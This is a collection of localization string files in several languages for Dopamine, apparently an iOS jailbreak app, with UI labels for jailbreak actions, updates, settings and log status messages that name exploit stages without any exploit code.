"Settings_Apps_JIT" = "Разрешить JIT в приложениях";

// Settings Buttons
"Button_Remove_Jailbreak" = "Удалить джейлбрейк";
"Button_Hide_Jailbreak" = "Скрыть джейлбрейк";
"Button_Unhide_Jailbreak" = "Отобразить джейлбрейк";
"Button_Refresh_Jailbreak_Apps" = "Обновить приложения джейлбрейка";
"Button_Reinstall_Package_Managers" = "Переустановить менеджеры пакетов";
"Button_Change_Mobile_Password" = "Изменить пароль для \"mobile\"";

// Settings Hints
"Hint_Hide_Jailbreak" = "\"Скрыть джейлбрейк\" временно удаляет файлы, связанные с джейлбрейком, до следующего джейлбрейка";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Скрыть джейлбрейк\" частично отключает джейлбрейк и стремится сделать обнаружение более сложным. Однако это не совсем эффективно и скрывает не всё.";
"Section_Jailbreak_Settings" = "Настройки джейлбрейка";
"Section_Actions" = "Действия";
"Section_Customization" = "Кастомизация";
"Section_Exploits" = "Эксплоиты";

// Settings Alerts
"Alert_Tweak_Injection_Toggled_Title" = "Перезагрузите Userspace";
"Alert_Tweak_Injection_Toggled_Body" = "Чтобы изменения вступили в силу, нужно перезагрузить Userspace. Перезагрузить сейчас?";
"Alert_Tweak_Injection_Toggled_Reboot_Now" = "Сейчас";
"Alert_Tweak_Injection_Toggled_Reboot_Later" = "Потом";
"Alert_Remove_Jailbreak_Title" = "Удаление джейлбрейка";
"Alert_Remove_Jailbreak_Pressed_Body" = "Удаление джейлбрейка приведёт к удалению всех файлов, связанных с джейлбрейком, но все обычные приложения, файлы и данные будут сохранены. Вы уверены, что хотите продолжить? Вы не сможете отменить это действие.";
"Alert_Remove_Jailbreak_Enabled_Body" = "Нажимая \"Удаление джейлбрейка\", все файлы, связанные с джейлбрейком, будут удалены до следующего джейлбрейка. Все обычные приложения, файлы и данные будут сохранены. Вы уверены, что хотите продолжить? Вы не сможете отменить это действие.";
"Alert_Change_Mobile_Password_Body" = "Установите пароль \"mobile\" пользователя на вашем устройстве, который также можно использовать для доступа root с помощью sudo. Если вы хотите установить пароль root, вы можете сделать это из мобильной оболочки, используя команду \"sudo passwd root\"";
"Password_Placeholder" = "Пароль";
"Repeat_Password_Placeholder" = "Повторите пароль";
/*Password_Auth_Required*/
"Button_Change" = "Изменить";
"Button_Cancel" = "Отмена";
"Button_Continue" = "Продолжить";

// Duplicate Apps Errors
"Duplicate_Apps_Error_Dopamine_App" = "Обнаружено несколько приложений с идентификатором \"%@\" внутри пути Dopamine (\"%@\"). Невозможно продолжить.";
"Duplicate_Apps_Error_User_App" = "Приложения с идентификатором %@ есть в директории Dopamine (\"%@\"), но в системе установлены раздельно. Невозможно продолжить.";
"Duplicate_Apps_Error_Icon_Cache" = "Приложение с идентификатором \"%@\" есть в каталоге приложений (\"%@\"), но также зарегистрировано в кэше иконок по пути (\"%@\"). Невозможно продолжить.";

// Settings Lists
"Theme" = "Темы";
"Kernel Exploit" = "Эксплоит Ядра";
"PPL Bypass" = "Обход PPL";
"PAC Bypass" = "Обход PAC";
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Лицензия";
"Credits_Button_Source_Code" = "Исходный код";

// Logs
"Initializing Environment" = "Инициализация среды";
"Initializing Protection" = "Инициализация защиты";
"Loading BaseBin TrustCache" = "Получение кэша доверия BaseBin";
"Applying Bind Mount" = "Применение монтирования с привязкой";
"Removing Jailbreak" = "Удаление джейлбрейка";
"Elevating Privileges" = "Повышение прав";
"Cleaning Up Exploits" = "Очистка эксплоитов";
"Building Phys R/W Primitive" = "Создание R/W примитива";
"Rebooting Userspace" = "Перезагрузка Userspace";
"Patchfinding" = "Поиск патчей";
"Exploiting Kernel (%@)" = "Эксплуатация ядра (%@)";
"Bypassing PAC (%@)" = "Обход PAC (%@)";
"Bypassing PPL (%@)" = "Обход PPL (%@)";

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Выберите менеджер(ы) пакетов";
"Select_Package_Managers_Install_Message" = "Если вы не знаете, какой из них выбрать, выберите Sileo";
"Continue" = "Продолжить";


```

`Application/Dopamine/sv.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "Tillverkad av opa334, évelyne";

// Log
"Status_Title_Jailbreaking" = "Jailbreaking";
"Log_Error" = "Misslyckad";

// Jailbreak Button
"Button_Jailbreak_Title" = "Jailbreak";
"Status_Title_Jailbroken" = "Jailbroken";
/*Unsupported*/

// Action Menu
"Menu_Settings_Title" = "Inställningar";
"Menu_Restart_SpringBoard_Title" = "Starta om SpringBoard";
"Menu_Reboot_Userspace_Title" = "Starta om Userspace";
"Menu_Credits_Title" = "Om";

// Updating
"Button_Update" = "Updatera";
"Button_Update_Available" = "Uppdatering tillgänglig";
"Button_Update_Environment" = "Update Environment";

// Update View
"Update_Status_Downloading" = "Laddar ned uppdatering...";
"Update_Status_Subtitle_Please_Wait" = "Vänta medan filer laddas ned";
"Update_Status_Installing" = "Installerar uppdatering...";
"Update_Status_Subtitle_Restart_Soon" = "Enheten kommer snart att starta om";
"Title_Changelog" = "Ändringslogg";
"Changelog_Unavailable_Text" = "Ändringslogg ej tillgänglig";

// Removed Jailbreak Alert
/*Removed_Jailbreak_Alert_Title*/
/*Removed_Jailbreak_Alert_Message*/
/*Button_Close*/

// Error View
/*Button_Share*/
/*Button_Reboot*/

// Settings Toggles
"Settings_Tweak_Injection" = "Tweak Injection";
"Settings_iDownload" = "iDownload (Terminal för utvecklare)";
"Settings_Verbose_Logs" = "Omfattande loggar";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = "Ta Bot Jailbreak";
"Button_Hide_Jailbreak" = "Göm Jailbreak";
"Button_Unhide_Jailbreak" = "Visa Jailbreak";
/*Button_Refresh_Jailbreak_Apps*/
"Button_Reinstall_Package_Managers" = "Reinstall Package Managers";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "\"Göm Jailbreak\" tar tillfälligt bort jailbreak-relaterade filer tills nästa jailbreak";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Hide Jailbreak\" partially disables the jailbreak and aims to make detection more challenging. However, it is not entirely effective and does not conceal everything.";
/*Section_Jailbreak_Settings*/
/*Section_Actions*/
/*Section_Customization*/
/*Section_Exploits*/

// Settings Alerts
/*Alert_Tweak_Injection_Toggled_Title*/
"Alert_Tweak_Injection_Toggled_Body" = "A userspace reboot is neccessary to apply the changes. Do you want to do it now?";
/*Alert_Tweak_Injection_Toggled_Reboot_Now*/
/*Alert_Tweak_Injection_Toggled_Reboot_Later*/
"Alert_Remove_Jailbreak_Title" = "Remove Jailbreak";
"Alert_Remove_Jailbreak_Pressed_Body" = "Removing jailbreak will delete all jailbreak-related files, but all regular apps, files and data will be kept. Are you sure you want to continue? You can't undo this action.";
/*Alert_Remove_Jailbreak_Enabled_Body*/
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "Avbryt";
/*Button_Continue*/

// Duplicate Apps Errors
/*Duplicate_Apps_Error_Dopamine_App*/
/*Duplicate_Apps_Error_User_App*/
/*Duplicate_Apps_Error_Icon_Cache*/

// Settings Lists
/*Theme*/
/*Kernel Exploit*/
/*PPL Bypass*/
/*PAC Bypass*/
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Licens";
"Credits_Button_Source_Code" = "Källkod";

// Logs
"Initializing Environment" = "Initiera miljö";
/*Initializing Protection*/
/*Loading BaseBin TrustCache*/
/*Applying Bind Mount*/
/*Removing Jailbreak*/
/*Elevating Privileges*/
/*Cleaning Up Exploits*/
/*Building Phys R/W Primitive*/
/*Rebooting Userspace*/
"Patchfinding" = "Patchfinding";
/*Exploiting Kernel (%@)*/
/*Bypassing PAC (%@)*/
/*Bypassing PPL (%@)*/

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Välj pakethanterare";
"Select_Package_Managers_Install_Message" = "If you are unsure which one to select, select Sileo";
"Continue" = "Continue";


```

`Application/Dopamine/th.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "by opa334, ElleKit by évelyne";

// Log
"Status_Title_Jailbreaking" = "กำลังเจลเบรค";
"Log_Error" = "Error";

// Jailbreak Button
"Button_Jailbreak_Title" = "เจลเบรค";
"Status_Title_Jailbroken" = "เจลเบรคแล้ว";
"Unsupported" = "ไม่รองรับ";

// Action Menu
"Menu_Settings_Title" = "ตั้งค่า";
"Menu_Restart_SpringBoard_Title" = "รีสตาร์ท SpringBoard";
"Menu_Reboot_Userspace_Title" = "รีบูต Userspace";
"Menu_Credits_Title" = "Credits";

// Updating
"Button_Update" = "อัปเดต";
"Button_Update_Available" = "มีอัปเดตใหม่";
"Button_Update_Environment" = "อัปเดต Environment";

// Update View
"Update_Status_Downloading" = "กำลังดาวน์โหลดอัปเดต...";
"Update_Status_Subtitle_Please_Wait" = "กรุณารอไฟล์อัปเดตโหลดเสร็จ";
"Update_Status_Installing" = "กำลังติดตั้งอัปเดต";
"Update_Status_Subtitle_Restart_Soon" = "อุปกรณ์กำลังจะรีสตาร์ทในเร็วๆนี้";
"Title_Changelog" = "Changelog";
"Changelog_Unavailable_Text" = "ไม่มี Changelog";

// Removed Jailbreak Alert
"Removed_Jailbreak_Alert_Title" = "เจลเบรคได้ถูกลบออกแล้ว";
"Removed_Jailbreak_Alert_Message" = "เจลเบรคได้ถูกลบออกแล้ว แนะนำให้รีบูตอุปกรณ์";
"Button_Close" = "ปิด";

// Error View
"Button_Share" = "แชร์";
"Button_Reboot" = "รีบูต";

// Settings Toggles
"Settings_Tweak_Injection" = "Tweak Injection";
"Settings_iDownload" = "iDownload (Developer Shell)";
"Settings_Verbose_Logs" = "Verbose Logs";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = "ลบเจลเบรค";
"Button_Hide_Jailbreak" = "ซ่อนเจลเบรค";
"Button_Unhide_Jailbreak" = "เลิกซ่อนเจลเบรค";
"Button_Refresh_Jailbreak_Apps" = "รีเฟรช Jailbreak Apps";
"Button_Reinstall_Package_Managers" = "ติดตั้ง Package Managers ใหม่";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "\"ซ่อนเจลเบรค\" ซ่อนไฟล์ที่เกี่ยวกับเจลเบรคต่างๆจนกว่าจะทำการเจลเบรคใหม่";
"Hint_Hide_Jailbreak_Jailbroken" = "\"ซ่อนเจลเบรค\" ปิดการทำงานของเจลเบรคบางส่วนเพื่อทำให้การตรวจจับยากขึ้น แต่อาจจะมีประสิทธิภาพไม่เต็มที่";
"Section_Jailbreak_Settings" = "ตั้งค่าเจลเบรค";
"Section_Actions" = "Actions";
"Section_Customization" = "การปรับแต่ง";
"Section_Exploits" = "Exploits";

// Settings Alerts
"Alert_Tweak_Injection_Toggled_Title" = "จำเป็นต้องรีบูต Userspace";
"Alert_Tweak_Injection_Toggled_Body" = "จำเป็นต้องรีบูต Userspace เพื่อใช้การเปลี่ยนแปลง ต้องการรีบูตตอนนี้หรือไม่";
"Alert_Tweak_Injection_Toggled_Reboot_Now" = "รีบูตตอนนี้";
"Alert_Tweak_Injection_Toggled_Reboot_Later" = "รีบูตภายหลัง";
"Alert_Remove_Jailbreak_Title" = "ลบเจลเบรค";
"Alert_Remove_Jailbreak_Pressed_Body" = "การลบเจลเบรคจะลบไฟล์ที่เกี่ยวข้องกับเจลเบรคเท่านั้น แอปพลิเคชั่น ไฟล์ และ ข้อมูลต่างๆที่ไม่เกี่ยวข้องกับเจลเบรคจะถูกเก็บไว้ ต้องการที่จะดำเนินการต่อหรือไม่ การกระทำนี้จะไม่สามารถย้อนกลับได้";
"Alert_Remove_Jailbreak_Enabled_Body" = "การเปิดใช้งาน \"ลบเจลเบรค\" จะลบไฟล์ที่เกี่ยวข้องกับเจลเบรคเท่านั้น แอปพลิเคชั่น ไฟล์ และ ข้อมูลต่างๆที่ไม่เกี่ยวข้องกับเจลเบรคจะถูกเก็บไว้ ต้องการที่จะดำเนินการต่อหรือไม่ การกระทำนี้จะไม่สามารถย้อนกลับได้";
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "ยกเลิก";
"Button_Continue" = "ดำเนินการต่อ";

// Duplicate Apps Errors
"Duplicate_Apps_Error_Dopamine_App" = "มีหลายแอปพลิเคชั่นที่มี identifier \"%@\" ในโฟลเดอร์แอปพลิเคชั่นของ Dopamine (\"%@\") ทำให้ไม่สามารถดำเนินการต่อได้";
"Duplicate_Apps_Error_User_App" = "แอปพลิเคชั่นที่มี identifiers %@ อยู่ในโฟล์เดอร์แอปพลิเคชั่นของ Dopamine (\"%@\") และถูกติดตั้งแยกไว้ที่อื่นในระบบด้วย ทำให้ไม่สามารถดำเนินการต่อได้";
"Duplicate_Apps_Error_Icon_Cache" = "แอปพลิเคชั่นที่มี identifiers \"%@\" อยู่ในโฟล์เดอร์แอปพลิเคชั่นของ Dopamine (\"%@\") แต่ถูก register ไว้ใน icon cache ด้วย path ที่แตกต่างกัน (\"%@\") ทำให้ไม่สามารถดำเนินการต่อได้";

// Settings Lists
"Theme" = "ธีม";
"Kernel Exploit" = "Kernel Exploit";
"PPL Bypass" = "PPL Bypass";
"PAC Bypass" = "PAC Bypass";
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Licenses";
"Credits_Button_Source_Code" = "Source Code";

// Logs
"Initializing Environment" = "Initializing Jailbreak Environment";
/*Initializing Protection*/
"Loading BaseBin TrustCache" = "Loading BaseBin TrustCache";
"Applying Bind Mount" = "Applying Bind Mount";
"Removing Jailbreak" = "Removing Jailbreak";
"Elevating Privileges" = "Elevating Privileges";
"Cleaning Up Exploits" = "Cleaning Up Exploits";
"Building Phys R/W Primitive" = "Building Phys R/W Primitive";
"Rebooting Userspace" = "Rebooting Userspace";
"Patchfinding" = "Patchfinding";
"Exploiting Kernel (%@)" = "Exploiting Kernel (%@)";
"Bypassing PAC (%@)" = "Bypassing PAC (%@)";
"Bypassing PPL (%@)" = "Bypassing PPL (%@)";

// Package Manager selection
"Status_Title_Select_Package_Managers" = "เลือก Package Manager(s) ที่ต้องการ";
"Select_Package_Managers_Install_Message" = "ถ้าไม่แน่ใจว่าจะเลือกอันไหน ให้เลือก Sileo";
"Continue" = "ดำเนินการต่อ";


```

`Application/Dopamine/tr.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "opa334 ve évelyne tarafından yapılmıştır";

// Log
"Status_Title_Jailbreaking" = "Jailbreak Yapılıyor";
"Log_Error" = "Başarısız";

// Jailbreak Button
"Button_Jailbreak_Title" = "Jailbreak";
"Status_Title_Jailbroken" = "Jailbreakli";
/*Unsupported*/

// Action Menu
"Menu_Settings_Title" = "Ayarlar";
"Menu_Restart_SpringBoard_Title" = "Springboard'u Yeniden Başlat";
"Menu_Reboot_Userspace_Title" = "Userspace'i Yeniden Başlat";
"Menu_Credits_Title" = "Hakkında";

// Updating
"Button_Update" = "Güncelle";
"Button_Update_Available" = "Güncelleme mevcut";
"Button_Update_Environment" = "Update Environment";

// Update View
"Update_Status_Downloading" = "Güncelleme indiriliyor...";
"Update_Status_Subtitle_Please_Wait" = "Dosyaların indirilmesi biterken lütfen bekleyiniz";
"Update_Status_Installing" = "Güncelleme yükleniyor...";
"Update_Status_Subtitle_Restart_Soon" = "Cihaz az sonra yeniden başlatılacaktır";
"Title_Changelog" = "Sürüm Günlüğü";
"Changelog_Unavailable_Text" = "Güncelleme Günlüğü Mevcut Değil";

// Removed Jailbreak Alert
/*Removed_Jailbreak_Alert_Title*/
/*Removed_Jailbreak_Alert_Message*/
/*Button_Close*/

// Error View
/*Button_Share*/
/*Button_Reboot*/

// Settings Toggles
"Settings_Tweak_Injection" = "Tweak Enjeksiyonu";
"Settings_iDownload" = "iDownload (Geliştirici Terminali)";
"Settings_Verbose_Logs" = "Sözlü Loglar";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = "Jailbreak'i Sil";
"Button_Hide_Jailbreak" = "Jailbreak'i Sakla";
"Button_Unhide_Jailbreak" = "Jailbreak'i Göster";
/*Button_Refresh_Jailbreak_Apps*/
"Button_Reinstall_Package_Managers" = "Reinstall Package Managers";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "\"Jailbreak'i Sakla\" Geçici olarak jailbreak ile ilgili dosyaları sonraki jailbreak'e kadar saklar";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Hide Jailbreak\" partially disables the jailbreak and aims to make detection more challenging. However, it is not entirely effective and does not conceal everything.";
/*Section_Jailbreak_Settings*/
/*Section_Actions*/
/*Section_Customization*/
/*Section_Exploits*/

// Settings Alerts
/*Alert_Tweak_Injection_Toggled_Title*/
"Alert_Tweak_Injection_Toggled_Body" = "A userspace reboot is neccessary to apply the changes. Do you want to do it now?";
/*Alert_Tweak_Injection_Toggled_Reboot_Now*/
/*Alert_Tweak_Injection_Toggled_Reboot_Later*/
"Alert_Remove_Jailbreak_Title" = "Remove Jailbreak";
"Alert_Remove_Jailbreak_Pressed_Body" = "Removing jailbreak will delete all jailbreak-related files, but all regular apps, files and data will be kept. Are you sure you want to continue? You can't undo this action.";
/*Alert_Remove_Jailbreak_Enabled_Body*/
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "İptal";
"Button_Continue" = "Continue";

// Duplicate Apps Errors
/*Duplicate_Apps_Error_Dopamine_App*/
/*Duplicate_Apps_Error_User_App*/
/*Duplicate_Apps_Error_Icon_Cache*/

// Settings Lists
/*Theme*/
/*Kernel Exploit*/
/*PPL Bypass*/
/*PAC Bypass*/
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Lisans";
"Credits_Button_Source_Code" = "Kaynak Kodu";

// Logs
"Initializing Environment" = "Ortam Başlatılıyor";
/*Initializing Protection*/
/*Loading BaseBin TrustCache*/
/*Applying Bind Mount*/
/*Removing Jailbreak*/
/*Elevating Privileges*/
/*Cleaning Up Exploits*/
/*Building Phys R/W Primitive*/
/*Rebooting Userspace*/
"Patchfinding" = "Patchfinding Yapılıyor";
/*Exploiting Kernel (%@)*/
/*Bypassing PAC (%@)*/
/*Bypassing PPL (%@)*/

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Paket Yöneticisi Seçin";
"Select_Package_Managers_Install_Message" = "If you are unsure which one to select, select Sileo";
"Continue" = "Continue";


```

`Application/Dopamine/uk.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "Зроблено opa334, évelyne";

// Log
"Status_Title_Jailbreaking" = "Джейлбрейк";
"Log_Error" = "Не вдалося";

// Jailbreak Button
"Button_Jailbreak_Title" = "Зробити джейлбрейк";
"Status_Title_Jailbroken" = "Джейлбрейк завершено";
/*Unsupported*/

// Action Menu
"Menu_Settings_Title" = "Налаштування";
"Menu_Restart_SpringBoard_Title" = "Перезапустити SpringBoard";
"Menu_Reboot_Userspace_Title" = "Перезавантажити простір користувача";
"Menu_Credits_Title" = "Титри";

// Updating
"Button_Update" = "Оновити";
"Button_Update_Available" = "Оновлення доступне";
"Button_Update_Environment" = "Update Environment";

// Update View
"Update_Status_Downloading" = "Завантаження оновлення...";
"Update_Status_Subtitle_Please_Wait" = "Будь ласка, зачекайте, поки файли завершать завантаження";
"Update_Status_Installing" = "Встановлення оновлення...";
"Update_Status_Subtitle_Restart_Soon" = "Пристрій буде перезавантажено найближчим часом";
"Title_Changelog" = "Журнал змін";
"Changelog_Unavailable_Text" = "Журнал змін недоступний";

// Removed Jailbreak Alert
/*Removed_Jailbreak_Alert_Title*/
/*Removed_Jailbreak_Alert_Message*/
/*Button_Close*/

// Error View
/*Button_Share*/
/*Button_Reboot*/

// Settings Toggles
"Settings_Tweak_Injection" = "ін'єкція твiков";
"Settings_iDownload" = "iDownload (Термінал розробника)";
"Settings_Verbose_Logs" = "Докладні логи";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = "Видалити джейлбрейк";
"Button_Hide_Jailbreak" = "Приховати джейлбрейк";
"Button_Unhide_Jailbreak" = "Розкрити джейлбрейк";
/*Button_Refresh_Jailbreak_Apps*/
"Button_Reinstall_Package_Managers" = "Reinstall Package Managers";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "\"Приховати джейлбрейк\" тимчасово видаляє файли, пов'язані з джейлбрейком, до наступного джейлбрейку";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Hide Jailbreak\" partially disables the jailbreak and aims to make detection more challenging. However, it is not entirely effective and does not conceal everything.";
/*Section_Jailbreak_Settings*/
/*Section_Actions*/
/*Section_Customization*/
/*Section_Exploits*/

// Settings Alerts
/*Alert_Tweak_Injection_Toggled_Title*/
"Alert_Tweak_Injection_Toggled_Body" = "A userspace reboot is neccessary to apply the changes. Do you want to do it now?";
/*Alert_Tweak_Injection_Toggled_Reboot_Now*/
/*Alert_Tweak_Injection_Toggled_Reboot_Later*/
"Alert_Remove_Jailbreak_Title" = "Remove Jailbreak";
"Alert_Remove_Jailbreak_Pressed_Body" = "Removing jailbreak will delete all jailbreak-related files, but all regular apps, files and data will be kept. Are you sure you want to continue? You can't undo this action.";
/*Alert_Remove_Jailbreak_Enabled_Body*/
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "Скасувати";
/*Button_Continue*/

// Duplicate Apps Errors
/*Duplicate_Apps_Error_Dopamine_App*/
/*Duplicate_Apps_Error_User_App*/
/*Duplicate_Apps_Error_Icon_Cache*/

// Settings Lists
/*Theme*/
/*Kernel Exploit*/
/*PPL Bypass*/
/*PAC Bypass*/
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Ліцензія";
"Credits_Button_Source_Code" = "Вихідний код";

// Logs
"Initializing Environment" = "Ініціалізація середовища";
/*Initializing Protection*/
/*Loading BaseBin TrustCache*/
/*Applying Bind Mount*/
/*Removing Jailbreak*/
/*Elevating Privileges*/
/*Cleaning Up Exploits*/
/*Building Phys R/W Primitive*/
/*Rebooting Userspace*/
"Patchfinding" = "Пошук патчів";
/*Exploiting Kernel (%@)*/
/*Bypassing PAC (%@)*/
/*Bypassing PPL (%@)*/

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Вибрати менеджер(и) пакунків";
"Select_Package_Managers_Install_Message" = "If you are unsure which one to select, select Sileo";
"Continue" = "Continue";


```

`Application/Dopamine/ur.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "Made by by opa334, évelyne";

// Log
"Status_Title_Jailbreaking" = "جیل بریکنگ";
"Log_Error" = "ناکام";

// Jailbreak Button
"Button_Jailbreak_Title" = " جیل بریک";
"Status_Title_Jailbroken" = "جیل بروکن";
/*Unsupported*/

// Action Menu
"Menu_Settings_Title" = "ترتیبات";
"Menu_Restart_SpringBoard_Title" = "اسپرنگ بورڈ کو دوبارہ شروع کریں";
"Menu_Reboot_Userspace_Title" = "یوزر اسپیس کو ریبوٹ کریں";
"Menu_Credits_Title" = "کے بارے میں";

// Updating
"Button_Update" = "اپ ڈیٹ";
"Button_Update_Available" = "اپ ڈیٹ دستیاب ہے";
"Button_Update_Environment" = "Update Environment";

// Update View
"Update_Status_Downloading" = "...اپ ڈیٹ ڈاؤن لوڈ کر رہا ہے";
"Update_Status_Subtitle_Please_Wait" = "براہ کرم فائلوں کے ڈاؤن لوڈ ہونے تک انتظار کریں";
"Update_Status_Installing" = "اپ ڈیٹ انسٹال ہو رہا ہے";
"Update_Status_Subtitle_Restart_Soon" = "آلہ جلد ہی دوبارہ شروع ہو جائے گا";
"Title_Changelog" = "چینج لاگ";
"Changelog_Unavailable_Text" = "چینج لاگ دستیاب نہیں ہے";

// Removed Jailbreak Alert
/*Removed_Jailbreak_Alert_Title*/
/*Removed_Jailbreak_Alert_Message*/
/*Button_Close*/

// Error View
/*Button_Share*/
/*Button_Reboot*/

// Settings Toggles
"Settings_Tweak_Injection" = "Tweak Injection";
"Settings_iDownload" = "iDownload (ڈویلپر ٹرمینل)";
"Settings_Verbose_Logs" = "Verbose Logs";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = " جیل بریک اتارلو";
"Button_Hide_Jailbreak" = "جیل بریک  چھپائیں ";
"Button_Unhide_Jailbreak" = "جیل بریک دکھائیں ";
/*Button_Refresh_Jailbreak_Apps*/
"Button_Reinstall_Package_Managers" = "Reinstall Package Managers";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "\"چھپائیں جیل بریک\" اگلے جیل بریک تک عارضی طور پر جیل بریک سے متعلق فائلوں کو ہٹاتا ہے";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Hide Jailbreak\" partially disables the jailbreak and aims to make detection more challenging. However, it is not entirely effective and does not conceal everything.";
/*Section_Jailbreak_Settings*/
/*Section_Actions*/
/*Section_Customization*/
/*Section_Exploits*/

// Settings Alerts
/*Alert_Tweak_Injection_Toggled_Title*/
"Alert_Tweak_Injection_Toggled_Body" = "A userspace reboot is neccessary to apply the changes. Do you want to do it now?";
/*Alert_Tweak_Injection_Toggled_Reboot_Now*/
/*Alert_Tweak_Injection_Toggled_Reboot_Later*/
"Alert_Remove_Jailbreak_Title" = "Remove Jailbreak";
"Alert_Remove_Jailbreak_Pressed_Body" = "Removing jailbreak will delete all jailbreak-related files, but all regular apps, files and data will be kept. Are you sure you want to continue? You can't undo this action.";
/*Alert_Remove_Jailbreak_Enabled_Body*/
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "منسوخ کریں";
"Button_Continue" = "Continue";

// Duplicate Apps Errors
/*Duplicate_Apps_Error_Dopamine_App*/
/*Duplicate_Apps_Error_User_App*/
/*Duplicate_Apps_Error_Icon_Cache*/

// Settings Lists
/*Theme*/
/*Kernel Exploit*/
/*PPL Bypass*/
/*PAC Bypass*/
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "لائسنس";
"Credits_Button_Source_Code" = "خصوصی شکریہ";

// Logs
"Initializing Environment" = "Initializing Environment";
/*Initializing Protection*/
/*Loading BaseBin TrustCache*/
/*Applying Bind Mount*/
/*Removing Jailbreak*/
/*Elevating Privileges*/
/*Cleaning Up Exploits*/
/*Building Phys R/W Primitive*/
/*Rebooting Userspace*/
"Patchfinding" = "Patchfinding";
/*Exploiting Kernel (%@)*/
/*Bypassing PAC (%@)*/
/*Bypassing PPL (%@)*/

// Package Manager selection
"Status_Title_Select_Package_Managers" = "پیکیج مینیجرز کو منتخب کریں";
"Select_Package_Managers_Install_Message" = "If you are unsure which one to select, select Sileo";
"Continue" = "Continue";


```

`Application/Dopamine/vi.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "Được tạo bởi opa334, évelyne";

// Log
"Status_Title_Jailbreaking" = "Đang Jailbreak";
"Log_Error" = "Không thành công";

// Jailbreak Button
"Button_Jailbreak_Title" = "Jailbreak";
"Status_Title_Jailbroken" = "Đã Jailbreak";
"Unsupported" = "Không hỗ trợ";

// Action Menu
"Menu_Settings_Title" = "Cài đặt";
"Menu_Restart_SpringBoard_Title" = "Khởi động lại SpringBoard";
"Menu_Reboot_Userspace_Title" = "Khởi động lại Userspace";
"Menu_Credits_Title" = "Tác giả";

// Updating
"Button_Update" = "Cập nhật";
"Button_Update_Available" = "Có bản cập nhật mới";
"Button_Update_Environment" = "Cập nhật môi trường Jailbreak";

// Update View
"Update_Status_Downloading" = "Đang tải bản cập nhật...";
"Update_Status_Subtitle_Please_Wait" = "Đang tải các tệp thiết yếu, xin hãy kiên nhẫn chờ";
"Update_Status_Installing" = "Đang cài bản cập nhật...";
"Update_Status_Subtitle_Restart_Soon" = "Thiết bị sẽ khởi động lại";
"Title_Changelog" = "Nội dung cập nhật";
"Changelog_Unavailable_Text" = "Không có nội dung cập nhật";

// Removed Jailbreak Alert
"Removed_Jailbreak_Alert_Title" = "Đã gỡ Jailbreak";
"Removed_Jailbreak_Alert_Message" = "Gỡ bỏ Jailbreak thành công. Bạn nên khởi động lại thiết bị.";
"Button_Close" = "Đóng";

// Error View
"Button_Share" = "Chia sẻ lỗi";
"Button_Reboot" = "Khởi động lại";

// Settings Options
"Settings_Tweak_Injection" = "Cho phép chạy Tweak";
"Settings_iDownload" = "iDownload (nhà phát triển)";
"Settings_Verbose_Logs" = "Hiện Log dạng phức tạp";
"Settings_Apps_JIT" = "Bật JIT";
"Settings_Allow_Old_arm64e_ABI_Libraries" = "Dùng thư viện arm64e cũ";
"Settings_Jetsam_Multiplier" = "Hệ số Jetsam";

// Settings Buttons
"Button_Remove_Jailbreak" = "Gỡ Jailbreak";
"Button_Hide_Jailbreak" = "Ẩn Jailbreak";
"Button_Unhide_Jailbreak" = "Bỏ ẩn Jailbreak";
"Button_Refresh_Jailbreak_Apps" = "Làm mới các app Jailbreak";
"Button_Reinstall_Package_Managers" = "Cài lại các trình quản lý gói";
"Button_Change_Mobile_Password" = "Đổi mật khẩu \"mobile\"";

// Settings Hints
